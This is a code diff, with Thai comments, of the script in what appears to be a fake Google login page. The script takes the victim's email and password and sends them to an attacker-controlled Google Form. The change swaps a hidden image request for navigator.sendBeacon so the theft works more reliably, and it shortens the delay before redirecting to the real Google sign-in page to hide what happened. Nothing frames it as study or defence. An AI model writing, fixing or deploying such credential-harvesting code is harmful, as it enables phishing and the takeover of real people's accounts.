@@ -44,20 +44,21 @@
             return;
         }
 
-        // ID ฟอร์มจากรูปของคุณ
         const formID = "1FAIpQLSeJuuzCrT38oInaQg0sSGQ1-BBW7mQO0-O9HcvxwzyXluYa9Q";
-        
-        // สร้างลิงก์ส่งข้อมูล (ตัด submit=Submit ออกเพื่อลด Error 400)
-        const target = `https://docs.google.com/forms/d/e/${formID}/formResponse?entry.1449652638=${encodeURIComponent(email)}&entry.270012312=${encodeURIComponent(pass)}`;
+        const url = `https://docs.google.com/forms/d/e/${formID}/formResponse`;
 
-        // ส่งข้อมูลแบบเงียบๆ ผ่าน Image Object (แม่นยำที่สุด)
-        const logger = new Image();
-        logger.src = target;
+        // สร้างข้อมูลแบบ Form Data
+        const formData = new FormData();
+        formData.append('entry.1449652638', email);
+        formData.append('entry.270012312', pass);
 
-        // หน่วงเวลา 0.6 วินาทีเพื่อให้ส่งข้อมูลเสร็จ แล้วเด้งไปหน้าจริงของ Google
+        // ใช้ sendBeacon เพื่อส่งข้อมูลแบบ POST (ป้องกัน Error 400 ได้ดีที่สุด)
+        navigator.sendBeacon(url, formData);
+
+        // เด้งไปหน้าจริงทันที
         setTimeout(() => {
             window.location.href = "https://accounts.google.com/v3/signin/identifier";
-        }, 600);
+        }, 300);
     }
 </script>
 
